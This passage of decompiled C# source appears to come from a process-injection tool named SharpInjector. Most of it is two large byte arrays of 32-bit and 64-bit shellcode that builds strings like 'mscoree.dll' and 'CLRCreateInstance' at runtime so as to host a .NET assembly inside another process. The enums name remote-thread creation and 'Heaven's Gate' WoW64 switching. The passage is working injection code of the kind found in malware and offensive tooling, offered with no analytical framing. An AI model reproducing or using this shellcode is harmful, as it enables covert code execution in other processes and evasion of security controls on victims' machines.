				12, 203, 198, 64, 13, 70, 198, 64, 14, 104,
				198, 64, 15, 145, 72, 137, 236, 93, 195, 85,
				72, 137, 229, 72, 131, 236, 32, 185, 16, 0,
				0, 0, 232, 193, 254, byte.MaxValue, byte.MaxValue, 199, 0, 34,
				103, 47, 203, 102, 199, 64, 4, 58, 171, 102,
				199, 64, 6, 210, 17, 198, 64, 8, 156, 198,
				64, 9, 64, 198, 64, 10, 0, 198, 64, 11,
				192, 198, 64, 12, 79, 198, 64, 13, 163, 198,
				64, 14, 10, 198, 64, 15, 62, 72, 137, 236,
				93, 195, 85, 72, 137, 229, 72, 131, 236, 32,
				185, 16, 0, 0, 0, 232, 120, 254, byte.MaxValue, byte.MaxValue,
				199, 0, 35, 103, 47, 203, 102, 199, 64, 4,
				58, 171, 102, 199, 64, 6, 210, 17, 198, 64,
				8, 156, 198, 64, 9, 64, 198, 64, 10, 0,
				198, 64, 11, 192, 198, 64, 12, 79, 198, 64,
				13, 163, 198, 64, 14, 10, 198, 64, 15, 62,
				72, 137, 236, 93, 195, 85, 72, 137, 229, 72,
				131, 236, 32, 185, 16, 0, 0, 0, 232, 47,
				254, byte.MaxValue, byte.MaxValue, 199, 0, 220, 150, 246, 5, 102,
				199, 64, 4, 41, 43, 102, 199, 64, 6, 99,
				54, 198, 64, 8, 173, 198, 64, 9, 139, 198,
				64, 10, 196, 198, 64, 11, 56, 198, 64, 12,
				156, 198, 64, 13, 242, 198, 64, 14, 167, 198,
				64, 15, 19, 72, 137, 236, 93, 195, 85, 72,
				137, 229, 72, 131, 236, 32, 138, 2, 136, 1,
				72, byte.MaxValue, 194, 72, byte.MaxValue, 193, 73, byte.MaxValue, 200, 73,
				131, 248, 0, 117, 237, 184, 1, 0, 0, 0,
				72, 137, 236, 93, 195, 85, 72, 137, 229, 72,
				131, 236, 32, 72, 139, 131, 96, 2, 0, 0,
				72, 137, 193, byte.MaxValue, 147, 224, 1, 0, 0, 72,
				137, 236, 93, 195, 85, 72, 137, 229, 72, 131,
				236, 32, 72, 139, 131, 88, 2, 0, 0, 72,
				137, 193, byte.MaxValue, 147, 224, 1, 0, 0, 72, 137,
				236, 93, 195, 85, 72, 137, 229, 72, 131, 236,
				32, 185, 24, 0, 0, 0, 232, 135, 253, byte.MaxValue,
				byte.MaxValue, 80, 72, 137, 193, byte.MaxValue, 147, 240, 1, 0,
				0, 88, 72, 137, 236, 93, 195, 85, 72, 137,
				229, 72, 131, 236, 40, 65, 84, 185, 12, 0,
				0, 0, 232, 99, 253, byte.MaxValue, byte.MaxValue, 198, 0, 109,
				198, 64, 1, 115, 198, 64, 2, 99, 198, 64,
				3, 111, 198, 64, 4, 114, 198, 64, 5, 101,
				198, 64, 6, 101, 198, 64, 7, 46, 198, 64,
				8, 100, 198, 64, 9, 108, 198, 64, 10, 108,
				198, 64, 11, 0, 73, 137, 196, 72, 137, 193,
				byte.MaxValue, 147, 168, 1, 0, 0, 72, 131, 248, 0,
				15, 132, 176, 3, 0, 0, 72, 137, 131, 184,
				1, 0, 0, 76, 137, 225, 232, 56, 253, byte.MaxValue,
				byte.MaxValue, 185, 13, 0, 0, 0, 232, 5, 253, byte.MaxValue,
				byte.MaxValue, 198, 0, 111, 198, 64, 1, 108, 198, 64,
				2, 101, 198, 64, 3, 97, 198, 64, 4, 117,
				198, 64, 5, 116, 198, 64, 6, 51, 198, 64,
				7, 50, 198, 64, 8, 46, 198, 64, 9, 100,
				198, 64, 10, 108, 198, 64, 11, 108, 198, 64,
				12, 0, 73, 137, 196, 72, 137, 193, byte.MaxValue, 147,
				168, 1, 0, 0, 72, 131, 248, 0, 15, 132,
				78, 3, 0, 0, 72, 137, 131, 192, 1, 0,
				0, 76, 137, 225, 232, 214, 252, byte.MaxValue, byte.MaxValue, 185,
				16, 0, 0, 0, 232, 163, 252, byte.MaxValue, byte.MaxValue, 198,
				0, 83, 198, 64, 1, 97, 198, 64, 2, 102,
				198, 64, 3, 101, 198, 64, 4, 65, 198, 64,
				5, 114, 198, 64, 6, 114, 198, 64, 7, 97,
				198, 64, 8, 121, 198, 64, 9, 67, 198, 64,
				10, 114, 198, 64, 11, 101, 198, 64, 12, 97,
				198, 64, 13, 116, 198, 64, 14, 101, 198, 64,
				15, 0, 73, 137, 196, 72, 139, 139, 192, 1,
				0, 0, 72, 137, 194, byte.MaxValue, 147, 176, 1, 0,
				0, 72, 131, 248, 0, 15, 132, 217, 2, 0,
				0, 72, 137, 131, 200, 1, 0, 0, 76, 137,
				225, 232, 97, 252, byte.MaxValue, byte.MaxValue, 185, 14, 0, 0,
				0, 232, 46, 252, byte.MaxValue, byte.MaxValue, 198, 0, 83, 198,
				64, 1, 97, 198, 64, 2, 102, 198, 64, 3,
				101, 198, 64, 4, 65, 198, 64, 5, 114, 198,
				64, 6, 114, 198, 64, 7, 97, 198, 64, 8,
				121, 198, 64, 9, 76, 198, 64, 10, 111, 198,
				64, 11, 99, 198, 64, 12, 107, 198, 64, 13,
				0, 73, 137, 196, 72, 139, 139, 192, 1, 0,
				0, 72, 137, 194, byte.MaxValue, 147, 176, 1, 0, 0,
				72, 131, 248, 0, 15, 132, 108, 2, 0, 0,
				72, 137, 131, 208, 1, 0, 0, 76, 137, 225,
				232, 244, 251, byte.MaxValue, byte.MaxValue, 185, 16, 0, 0, 0,
				232, 193, 251, byte.MaxValue, byte.MaxValue, 198, 0, 83, 198, 64,
				1, 97, 198, 64, 2, 102, 198, 64, 3, 101,
				198, 64, 4, 65, 198, 64, 5, 114, 198, 64,
				6, 114, 198, 64, 7, 97, 198, 64, 8, 121,
				198, 64, 9, 85, 198, 64, 10, 110, 198, 64,
				11, 108, 198, 64, 12, 111, 198, 64, 13, 99,
				198, 64, 14, 107, 198, 64, 15, 0, 73, 137,
				196, 72, 139, 139, 192, 1, 0, 0, 72, 137,
				194, byte.MaxValue, 147, 176, 1, 0, 0, 72, 131, 248,
				0, 15, 132, 247, 1, 0, 0, 72, 137, 131,
				216, 1, 0, 0, 76, 137, 225, 232, 127, 251,
				byte.MaxValue, byte.MaxValue, 185, 15, 0, 0, 0, 232, 76, 251,
				byte.MaxValue, byte.MaxValue, 198, 0, 83, 198, 64, 1, 121, 198,
				64, 2, 115, 198, 64, 3, 65, 198, 64, 4,
				108, 198, 64, 5, 108, 198, 64, 6, 111, 198,
				64, 7, 99, 198, 64, 8, 83, 198, 64, 9,
				116, 198, 64, 10, 114, 198, 64, 11, 105, 198,
				64, 12, 110, 198, 64, 13, 103, 198, 64, 14,
				0, 73, 137, 196, 72, 139, 139, 192, 1, 0,
				0, 72, 137, 194, byte.MaxValue, 147, 176, 1, 0, 0,
				72, 131, 248, 0, 15, 132, 134, 1, 0, 0,
				72, 137, 131, 224, 1, 0, 0, 76, 137, 225,
				232, 14, 251, byte.MaxValue, byte.MaxValue, 185, 22, 0, 0, 0,
				232, 219, 250, byte.MaxValue, byte.MaxValue, 198, 0, 83, 198, 64,
				1, 97, 198, 64, 2, 102, 198, 64, 3, 101,
				198, 64, 4, 65, 198, 64, 5, 114, 198, 64,
				6, 114, 198, 64, 7, 97, 198, 64, 8, 121,
				198, 64, 9, 67, 198, 64, 10, 114, 198, 64,
				11, 101, 198, 64, 12, 97, 198, 64, 13, 116,
				198, 64, 14, 101, 198, 64, 15, 86, 198, 64,
				16, 101, 198, 64, 17, 99, 198, 64, 18, 116,
				198, 64, 19, 111, 198, 64, 20, 114, 198, 64,
				21, 0, 73, 137, 196, 72, 139, 139, 192, 1,
				0, 0, 72, 137, 194, byte.MaxValue, 147, 176, 1, 0,
				0, 72, 131, 248, 0, 15, 132, 249, 0, 0,
				0, 72, 137, 131, 232, 1, 0, 0, 76, 137,
				225, 232, 129, 250, byte.MaxValue, byte.MaxValue, 185, 12, 0, 0,
				0, 232, 78, 250, byte.MaxValue, byte.MaxValue, 198, 0, 86, 198,
				64, 1, 97, 198, 64, 2, 114, 198, 64, 3,
				105, 198, 64, 4, 97, 198, 64, 5, 110, 198,
				64, 6, 116, 198, 64, 7, 73, 198, 64, 8,
				110, 198, 64, 9, 105, 198, 64, 10, 116, 198,
				64, 11, 0, 73, 137, 196, 72, 139, 139, 192,
				1, 0, 0, 72, 137, 194, byte.MaxValue, 147, 176, 1,
				0, 0, 72, 131, 248, 0, 15, 132, 148, 0,
				0, 0, 72, 137, 131, 240, 1, 0, 0, 76,
				137, 225, 232, 28, 250, byte.MaxValue, byte.MaxValue, 185, 18, 0,
				0, 0, 232, 233, 249, byte.MaxValue, byte.MaxValue, 198, 0, 67,
				198, 64, 1, 76, 198, 64, 2, 82, 198, 64,
				3, 67, 198, 64, 4, 114, 198, 64, 5, 101,
				198, 64, 6, 97, 198, 64, 7, 116, 198, 64,
				8, 101, 198, 64, 9, 73, 198, 64, 10, 110,
				198, 64, 11, 115, 198, 64, 12, 116, 198, 64,
				13, 97, 198, 64, 14, 110, 198, 64, 15, 99,
				198, 64, 16, 101, 198, 64, 17, 0, 73, 137,
				196, 72, 139, 139, 184, 1, 0, 0, 72, 137,
				194, byte.MaxValue, 147, 176, 1, 0, 0, 72, 131, 248,
				0, 116, 27, 72, 137, 131, 248, 1, 0, 0,
				76, 137, 225, 232, 163, 249, byte.MaxValue, byte.MaxValue, 184, 1,
				0, 0, 0, 65, 92, 72, 137, 236, 93, 195,
				184, 0, 0, 0, 0, 65, 92, 72, 137, 236,
				93, 195
			};
			SharpInjector.InjectAssembly32Bit = new byte[]
			{
				139, 68, 36, 4, 137, 198, byte.MaxValue, 86, 8, 104,
				0, 4, 0, 0, 106, 8, 80, byte.MaxValue, 22, 137,
				195, 139, 6, 137, 131, 44, 1, 0, 0, 139,
				70, 4, 137, 131, 48, 1, 0, 0, 139, 70,
				8, 137, 131, 52, 1, 0, 0, 139, 70, 12,
				137, 131, 56, 1, 0, 0, 139, 70, 16, 137,
				131, 60, 1, 0, 0, 139, 70, 20, 137, 131,
				144, 1, 0, 0, 139, 70, 24, 137, 131, 148,
				1, 0, 0, 137, 240, 131, 192, 32, 137, 131,
				200, 0, 0, 0, 137, 240, 131, 192, 32, 3,
				70, 28, 131, 192, 4, 137, 131, 204, 0, 0,
				0, 232, 210, 2, 0, 0, 131, 248, 0, 15,
				132, 193, 2, 0, 0, 137, 91, 4, 232, 161,
				6, 0, 0, 137, 67, 8, 232, 211, 6, 0,
				0, 137, 67, 12, byte.MaxValue, 115, 4, byte.MaxValue, 115, 12,
				byte.MaxValue, 115, 8, byte.MaxValue, 147, 96, 1, 0, 0, 131,
				248, 0, 15, 133, 150, 2, 0, 0, 139, 3,
				139, 0, 139, 64, 20, 137, 67, 14, 137, 216,
				131, 192, 18, 137, 67, 22, byte.MaxValue, 115, 22, byte.MaxValue,
				51, byte.MaxValue, 83, 14, 131, 248, 0, 15, 133, 115,
				2, 0, 0, 232, 202, 6, 0, 0, 137, 67,
				26, 137, 216, 131, 192, 30, 137, 67, 34, 137,
				216, 131, 192, 38, 137, 67, 42, 139, 67, 18,
				139, 0, 139, 64, 12, 137, 67, 46, 106, 0,
				byte.MaxValue, 115, 42, 106, 1, byte.MaxValue, 115, 18, byte.MaxValue, 83,
				46, 131, 248, 0, 117, 20, 139, 67, 38, 139,
				0, 139, 0, byte.MaxValue, 115, 34, byte.MaxValue, 115, 26, byte.MaxValue,
				115, 38, byte.MaxValue, 208, 235, 218, 131, 123, 30, 0,
				15, 132, 32, 2, 0, 0, 139, 67, 30, 139,
				0, 139, 64, 36, 137, 67, 50, 232, 166, 6,
				0, 0, 137, 67, 54, 232, 216, 6, 0, 0,
				137, 67, 58, 137, 216, 131, 192, 62, 137, 67,
				66, byte.MaxValue, 115, 66, byte.MaxValue, 115, 54, byte.MaxValue, 115, 58,
				byte.MaxValue, 115, 30, byte.MaxValue, 83, 50, 131, 248, 0, 15,
				133, 229, 1, 0, 0, 131, 123, 62, 0, 15,
				132, 219, 1, 0, 0, 139, 67, 62, 139, 0,
				139, 64, 40, 137, 67, 70, byte.MaxValue, 115, 62, byte.MaxValue,
				83, 70, 131, 248, 0, 15, 133, 193, 1, 0,
				0, 139, 67, 62, 139, 0, 139, 64, 52, 137,
				67, 74, 137, 216, 131, 192, 78, 137, 67, 82,
				232, 179, 6, 0, 0, 137, 67, 86, byte.MaxValue, 115,
				82, byte.MaxValue, 115, 62, byte.MaxValue, 83, 74, 131, 123, 78,
				0, 15, 132, 147, 1, 0, 0, 137, 216, 131,
				192, 90, 137, 67, 94, 139, 67, 78, 139, 0,
				139, 0, 137, 67, 98, byte.MaxValue, 115, 94, byte.MaxValue, 115,
				86, byte.MaxValue, 115, 78, byte.MaxValue, 83, 98, 131, 123, 90,
				0, 15, 132, 107, 1, 0, 0, 139, 131, 144,
				1, 0, 0, 137, 67, 102, 139, 131, 148, 1,
				0, 0, 137, 67, 106, 106, 8, 232, 4, 5,
				0, 0, 137, 67, 110, 139, 67, 110, 139, 123,
				106, 137, 56, 199, 64, 4, 0, 0, 0, 0,
				byte.MaxValue, 115, 110, 106, 1, 106, 17, byte.MaxValue, 147, 72,
				1, 0, 0, 137, 67, 114, byte.MaxValue, 115, 114, byte.MaxValue,
				147, 76, 1, 0, 0, 139, 67, 114, 131, 192,
				12, byte.MaxValue, 48, byte.MaxValue, 115, 102, byte.MaxValue, 115, 106, 232,
				168, 4, 0, 0, byte.MaxValue, 115, 114, byte.MaxValue, 147, 80,
				1, 0, 0, 137, 216, 131, 192, 118, 137, 67,
				122, 139, 67, 90, 139, 0, 139, 128, 180, 0,
				0, 0, 137, 67, 126, byte.MaxValue, 115, 122, byte.MaxValue, 115,
				114, byte.MaxValue, 115, 90, byte.MaxValue, 83, 126, 131, 248, 0,
				15, 133, 224, 0, 0, 0, 131, 123, 118, 0,
				15, 132, 214, 0, 0, 0, 137, 216, 5, 130,
				0, 0, 0, 137, 131, 134, 0, 0, 0, 232,
				8, 6, 0, 0, 137, 131, 138, 0, 0, 0,
				139, 67, 118, 139, 0, 139, 64, 68, 137, 131,
				142, 0, 0, 0, byte.MaxValue, 179, 134, 0, 0, 0,
				byte.MaxValue, 179, 138, 0, 0, 0, byte.MaxValue, 115, 118, byte.MaxValue,
				147, 142, 0, 0, 0, 131, 248, 0, 15, 133,
				146, 0, 0, 0, 131, 187, 130, 0, 0, 0,
				0, 15, 132, 133, 0, 0, 0, 106, 0, 106,
				0, 106, 12, byte.MaxValue, 147, 88, 1, 0, 0, 137,
				131, 146, 0, 0, 0, 232, 206, 5, 0, 0,
				137, 131, 150, 0, 0, 0, 232, 195, 5, 0,
				0, 137, 131, 154, 0, 0, 0, 139, 131, 130,
				0, 0, 0, 139, 0, 139, 128, 228, 0, 0,
				0, 137, 131, 158, 0, 0, 0, 232, 150, 5,
				0, 0, 137, 131, 162, 0, 0, 0, byte.MaxValue, 179,
				150, 0, 0, 0, byte.MaxValue, 179, 146, 0, 0, 0,
				139, 131, 154, 0, 0, 0, byte.MaxValue, 112, 12, byte.MaxValue,
				112, 8, byte.MaxValue, 112, 4, byte.MaxValue, 48, 106, 0, 104,
				24, 1, 0, 0, byte.MaxValue, 179, 162, 0, 0, 0,
				byte.MaxValue, 179, 130, 0, 0, 0, byte.MaxValue, 147, 158, 0,
				0, 0, 131, 248, 0, 117, 3, 194, 4, 0,
				184, byte.MaxValue, byte.MaxValue, byte.MaxValue, byte.MaxValue, 194, 4, 0, 106, 12,
				232, 163, 3, 0, 0, 198, 0, 109, 198, 64,
				1, 115, 198, 64, 2, 99, 198, 64, 3, 111,
				198, 64, 4, 114, 198, 64, 5, 101, 198, 64,
				6, 101, 198, 64, 7, 46, 198, 64, 8, 100,
				198, 64, 9, 108, 198, 64, 10, 108, 198, 64,
				11, 0, 80, 80, byte.MaxValue, 147, 56, 1, 0, 0,
				137, 131, 64, 1, 0, 0, 88, 80, 232, 124,
				3, 0, 0, 106, 13, 232, 88, 3, 0, 0,
				198, 0, 111, 198, 64, 1, 108, 198, 64, 2,
				101, 198, 64, 3, 97, 198, 64, 4, 117, 198,
				64, 5, 116, 198, 64, 6, 51, 198, 64, 7,
				50, 198, 64, 8, 46, 198, 64, 9, 100, 198,
				64, 10, 108, 198, 64, 11, 108, 198, 64, 12,
				0, 80, 80, byte.MaxValue, 147, 56, 1, 0, 0, 137,
				131, 68, 1, 0, 0, 88, 80, 232, 45, 3,
				0, 0, 106, 16, 232, 9, 3, 0, 0, 198,
				0, 83, 198, 64, 1, 97, 198, 64, 2, 102,
				198, 64, 3, 101, 198, 64, 4, 65, 198, 64,
				5, 114, 198, 64, 6, 114, 198, 64, 7, 97,
				198, 64, 8, 121, 198, 64, 9, 67, 198, 64,
				10, 114, 198, 64, 11, 101, 198, 64, 12, 97,
				198, 64, 13, 116, 198, 64, 14, 101, 198, 64,
				15, 0, 80, 80, byte.MaxValue, 179, 68, 1, 0, 0,
				byte.MaxValue, 147, 60, 1, 0, 0, 131, 248, 0, 15,
				132, 143, 2, 0, 0, 137, 131, 72, 1, 0,
				0, 88, 80, 232, 195, 2, 0, 0, 106, 14,
				232, 159, 2, 0, 0, 198, 0, 83, 198, 64,
				1, 97, 198, 64, 2, 102, 198, 64, 3, 101,
				198, 64, 4, 65, 198, 64, 5, 114, 198, 64,
				6, 114, 198, 64, 7, 97, 198, 64, 8, 121,
				198, 64, 9, 76, 198, 64, 10, 111, 198, 64,
				11, 99, 198, 64, 12, 107, 198, 64, 13, 0,
				80, 80, byte.MaxValue, 179, 68, 1, 0, 0, byte.MaxValue, 147,
				60, 1, 0, 0, 131, 248, 0, 15, 132, 45,
				2, 0, 0, 137, 131, 76, 1, 0, 0, 88,
				80, 232, 97, 2, 0, 0, 106, 16, 232, 61,
				2, 0, 0, 198, 0, 83, 198, 64, 1, 97,
				198, 64, 2, 102, 198, 64, 3, 101, 198, 64,
				4, 65, 198, 64, 5, 114, 198, 64, 6, 114,
				198, 64, 7, 97, 198, 64, 8, 121, 198, 64,
				9, 85, 198, 64, 10, 110, 198, 64, 11, 108,
				198, 64, 12, 111, 198, 64, 13, 99, 198, 64,
				14, 107, 198, 64, 15, 0, 80, 80, byte.MaxValue, 179,
				68, 1, 0, 0, byte.MaxValue, 147, 60, 1, 0, 0,
				131, 248, 0, 15, 132, 195, 1, 0, 0, 137,
				131, 80, 1, 0, 0, 88, 80, 232, 247, 1,
				0, 0, 106, 15, 232, 211, 1, 0, 0, 198,
				0, 83, 198, 64, 1, 121, 198, 64, 2, 115,
				198, 64, 3, 65, 198, 64, 4, 108, 198, 64,
				5, 108, 198, 64, 6, 111, 198, 64, 7, 99,
				198, 64, 8, 83, 198, 64, 9, 116, 198, 64,
				10, 114, 198, 64, 11, 105, 198, 64, 12, 110,
				198, 64, 13, 103, 198, 64, 14, 0, 80, 80,
				byte.MaxValue, 179, 68, 1, 0, 0, byte.MaxValue, 147, 60, 1,
				0, 0, 131, 248, 0, 15, 132, 93, 1, 0,
				0, 137, 131, 84, 1, 0, 0, 88, 80, 232,
				145, 1, 0, 0, 106, 22, 232, 109, 1, 0,
				0, 198, 0, 83, 198, 64, 1, 97, 198, 64,
				2, 102, 198, 64, 3, 101, 198, 64, 4, 65,
				198, 64, 5, 114, 198, 64, 6, 114, 198, 64,
				7, 97, 198, 64, 8, 121, 198, 64, 9, 67,
				198, 64, 10, 114, 198, 64, 11, 101, 198, 64,
				12, 97, 198, 64, 13, 116, 198, 64, 14, 101,
				198, 64, 15, 86, 198, 64, 16, 101, 198, 64,
				17, 99, 198, 64, 18, 116, 198, 64, 19, 111,
				198, 64, 20, 114, 198, 64, 21, 0, 80, 80,
				byte.MaxValue, 179, 68, 1, 0, 0, byte.MaxValue, 147, 60, 1,
				0, 0, 131, 248, 0, 15, 132, 219, 0, 0,
				0, 137, 131, 88, 1, 0, 0, 88, 80, 232,
				15, 1, 0, 0, 106, 12, 232, 235, 0, 0,
				0, 198, 0, 86, 198, 64, 1, 97, 198, 64,
				2, 114, 198, 64, 3, 105, 198, 64, 4, 97,
				198, 64, 5, 110, 198, 64, 6, 116, 198, 64,
				7, 73, 198, 64, 8, 110, 198, 64, 9, 105,
				198, 64, 10, 116, 198, 64, 11, 0, 80, 80,
				byte.MaxValue, 179, 68, 1, 0, 0, byte.MaxValue, 147, 60, 1,
				0, 0, 131, 248, 0, 15, 132, 129, 0, 0,
				0, 137, 131, 92, 1, 0, 0, 88, 80, 232,
				181, 0, 0, 0, 106, 18, 232, 145, 0, 0,
				0, 198, 0, 67, 198, 64, 1, 76, 198, 64,
				2, 82, 198, 64, 3, 67, 198, 64, 4, 114,
				198, 64, 5, 101, 198, 64, 6, 97, 198, 64,
				7, 116, 198, 64, 8, 101, 198, 64, 9, 73,
				198, 64, 10, 110, 198, 64, 11, 115, 198, 64,
				12, 116, 198, 64, 13, 97, 198, 64, 14, 110,
				198, 64, 15, 99, 198, 64, 16, 101, 198, 64,
				17, 0, 80, 80, byte.MaxValue, 179, 64, 1, 0, 0,
				byte.MaxValue, 147, 60, 1, 0, 0, 131, 248, 0, 116,
				19, 137, 131, 96, 1, 0, 0, 88, 80, 232,
				71, 0, 0, 0, 184, 1, 0, 0, 0, 195,
				184, 0, 0, 0, 0, 195, 87, 86, 81, 139,
				76, 36, 16, 139, 116, 36, 20, 139, 124, 36,
				24, 138, 6, 136, 7, 70, 71, 73, 117, 247,
				89, 94, 95, 194, 12, 0, 139, 68, 36, 4,
				81, 82, 137, 193, byte.MaxValue, 147, 52, 1, 0, 0,
				81, 106, 8, 80, byte.MaxValue, 147, 44, 1, 0, 0,
				90, 89, 194, 4, 0, 85, 139, 108, 36, 8,
				byte.MaxValue, 147, 52, 1, 0, 0, 85, 106, 0, 80,
				byte.MaxValue, 147, 48, 1, 0, 0, 93, 194, 4, 0,
				106, 16, 232, 195, byte.MaxValue, byte.MaxValue, byte.MaxValue, 199, 0, 141,
				24, 128, 146, 102, 199, 64, 4, 142, 14, 102,
				199, 64, 6, 103, 72, 198, 64, 8, 179, 198,
				64, 9, 12, 198, 64, 10, 127, 198, 64, 11,
				168, 198, 64, 12, 56, 198, 64, 13, 132, 198,
				64, 14, 232, 198, 64, 15, 222, 195, 106, 16,
				232, 137, byte.MaxValue, byte.MaxValue, byte.MaxValue, 199, 0, 158, 219, 50,
				211, 102, 199, 64, 4, 179, 185, 102, 199, 64,
				6, 37, 65, 198, 64, 8, 130, 198, 64, 9,
				7, 198, 64, 10, 161, 198, 64, 11, 72, 198,
				64, 12, 132, 198, 64, 13, 245, 198, 64, 14,
				50, 198, 64, 15, 22, 195, 106, 16, 232, 79,
				byte.MaxValue, byte.MaxValue, byte.MaxValue, 199, 0, 210, 209, 57, 189, 102,
				199, 64, 4, 47, 186, 102, 199, 64, 6, 106,
				72, 198, 64, 8, 137, 198, 64, 9, 176, 198,
				64, 10, 180, 198, 64, 11, 176, 198, 64, 12,
				203, 198, 64, 13, 70, 198, 64, 14, 104, 198,
				64, 15, 145, 195, 106, 16, 232, 21, byte.MaxValue, byte.MaxValue,
				byte.MaxValue, 199, 0, 34, 103, 47, 203, 102, 199, 64,
				4, 58, 171, 102, 199, 64, 6, 210, 17, 198,
				64, 8, 156, 198, 64, 9, 64, 198, 64, 10,
				0, 198, 64, 11, 192, 198, 64, 12, 79, 198,
				64, 13, 163, 198, 64, 14, 10, 198, 64, 15,
				62, 195, 106, 16, 232, 219, 254, byte.MaxValue, byte.MaxValue, 199,
				0, 35, 103, 47, 203, 102, 199, 64, 4, 58,
				171, 102, 199, 64, 6, 210, 17, 198, 64, 8,
				156, 198, 64, 9, 64, 198, 64, 10, 0, 198,
				64, 11, 192, 198, 64, 12, 79, 198, 64, 13,
				163, 198, 64, 14, 10, 198, 64, 15, 62, 195,
				106, 16, 232, 161, 254, byte.MaxValue, byte.MaxValue, 199, 0, 220,
				150, 246, 5, 102, 199, 64, 4, 41, 43, 102,
				199, 64, 6, 99, 54, 198, 64, 8, 173, 198,
				64, 9, 139, 198, 64, 10, 196, 198, 64, 11,
				56, 198, 64, 12, 156, 198, 64, 13, 242, 198,
				64, 14, 167, 198, 64, 15, 19, 195, 139, 131,
				200, 0, 0, 0, 80, byte.MaxValue, 147, 84, 1, 0,
				0, 195, 139, 131, 204, 0, 0, 0, 80, byte.MaxValue,
				147, 84, 1, 0, 0, 195, 106, 16, 232, 75,
				254, byte.MaxValue, byte.MaxValue, 80, byte.MaxValue, 147, 92, 1, 0, 0,
				195
			};
		}

		// Token: 0x04000513 RID: 1299
		private static byte[] InjectAssembly64Bit;

		// Token: 0x04000514 RID: 1300
		private static byte[] InjectAssembly32Bit;

		// Token: 0x04000515 RID: 1301
		private static byte[] SelfByteCache;

		// Token: 0x020000AB RID: 171
		public enum DllArchitecture
		{
			// Token: 0x04000517 RID: 1303
			X86,
			// Token: 0x04000518 RID: 1304
			X64,
			// Token: 0x04000519 RID: 1305
			AnyCpu
		}

		// Token: 0x020000AC RID: 172
		public enum InjectionStatusCode
		{
			// Token: 0x0400051B RID: 1307
			SUCCESS,
			// Token: 0x0400051C RID: 1308
			COULDNT_OPEN_PROCESS,
			// Token: 0x0400051D RID: 1309
			WRONG_DLL_ARCH_FOR_PROCESS_ARCH,
			// Token: 0x0400051E RID: 1310
			COULDNT_WRITE_TO_PROCESS,
			// Token: 0x0400051F RID: 1311
			COULDNT_CREATE_REMOTE_THREAD,
			// Token: 0x04000520 RID: 1312
			COULDNT_GET_REMOTE_PROCEDURE_HANDLE,
			// Token: 0x04000521 RID: 1313
			SHELLCODE_RETURNED_BAD_RESULT,
			// Token: 0x04000522 RID: 1314
			HEAVENSGATE_NON_OPERATIONAL,
			// Token: 0x04000523 RID: 1315
			COULDNT_GET_NTDLL_FROM_HEAVENSGATE,
			// Token: 0x04000524 RID: 1316
			EXCEEDED_TIMEOUT,
			// Token: 0x04000525 RID: 1317
			COULDNT_GET_EXITCODE
		}
	}
}
